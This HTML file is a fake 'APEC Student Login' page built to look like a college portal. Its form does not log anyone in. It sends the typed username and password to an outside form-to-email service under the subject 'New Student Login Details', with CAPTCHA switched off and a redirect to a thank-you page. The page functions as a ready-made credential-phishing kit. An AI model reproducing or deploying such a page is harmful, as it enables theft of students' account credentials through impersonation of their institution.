<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>APEC Student Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#003366,#0099ff);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:360px;
    background:#fff;
    padding:30px;
    border-radius:12px;
    box-shadow:0 0 20px rgba(0,0,0,0.3);
    text-align:center;
}

.container img{
    width:100px;
    height:100px;
    object-fit:contain;
    margin-bottom:15px;
}

.container h2{
    color:#003366;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    margin-top:10px;
    border:none;
    border-radius:5px;
    background:#003366;
    color:#fff;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}

.footer{
    margin-top:15px;
    font-size:13px;
    color:#777;
}
</style>
</head>

<body>

<div class="container">

    <!-- College Logo -->
    <img src="1697346843915.jpeg" alt="College Logo">

    <h2>Student Login</h2>

    <form action="https://formsubmit.co/YOUR_EMAIL@gmail.com" method="POST">

        <!-- Disable CAPTCHA -->
        <input type="hidden" name="_captcha" value="false">

        <!-- Email Subject -->
        <input type="hidden" name="_subject" value="New Student Login Details">

        <!-- Redirect after submission -->
        <input type="hidden" name="_next" value="thankyou.html">

        <!-- Username -->
        <input
            type="text"
            name="Username"
            placeholder="Enter Username"
            required
        >

        <!-- Password -->
        <input
            type="password"
            name="Password"
            placeholder="Enter Password"
            required
        >

        <!-- Login Button -->
        <button type="submit">Login</button>

    </form>

    <div class="footer">
        © 2026 APEC Student Login Portal
    </div>

</div>

</body>
</html>
